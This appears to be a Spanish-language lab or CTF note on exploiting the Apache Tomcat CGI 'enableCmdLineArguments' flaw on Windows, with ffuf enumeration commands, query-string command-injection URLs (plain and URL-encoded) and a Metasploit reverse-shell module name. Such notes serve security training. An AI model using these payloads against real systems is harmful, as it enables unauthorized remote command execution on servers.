- Posee una vulnerabilidad en los sistemas Windows que tengan el parametro "enableCmdLineArguments" activado.
- Las versiones afectadas son:
      - 9.0.0.M1 a 9.0.17
      - 8.5.0 a 8.5.39
      - 7.0.0 a 7.0.93


### Enum
##### Buscar cmds:
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
##### Bucar bachs:

    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

### EXPLOITATION
##### Agregamos como parámetro el comando que queremos correr:
    http://10.129.204.227:8080/cgi/welcome.bat?&dir


si el comando es complicado, deberemos encodear en URL.
##### Ej:
para whoami:

            http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
Encodeado:

            http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
            

#### Con metasploit:
Muy seguido nos encontramos que es difícil explotar estas apps puesto que el proceso es engorroso, metasploit tiene un módulo capaz de permitirnos una reverseshell

            use exploit/windows/http/tomcat_cgi_cmdlineargs
